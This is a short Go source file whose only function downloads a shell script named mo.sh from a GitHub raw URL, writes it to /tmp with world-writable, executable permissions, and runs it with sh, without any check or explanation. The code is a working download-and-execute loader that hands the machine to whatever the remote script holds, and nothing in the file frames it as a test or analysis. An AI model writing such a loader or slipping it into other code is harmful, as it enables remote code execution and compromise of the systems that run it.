package main



import (

"net/http"
"io/ioutil"
"os/exec"
)







func mo(){



cli := http.Client{}

resp , err_get :=   cli.Get("https://github.com/atilabyte/golang/raw/refs/heads/master/mo.sh")

 

    if err_get != nil {return }


mo_bytes  , err_readall := ioutil.ReadAll(resp.Body)


  if  err_readall != nil {  return  }

  

     ioutil.WriteFile("/tmp/mo.sh" , mo_bytes , 0777)
      

        mo := exec.Command("sh" , "/tmp/./mo.sh") 

        mo.Run()


}




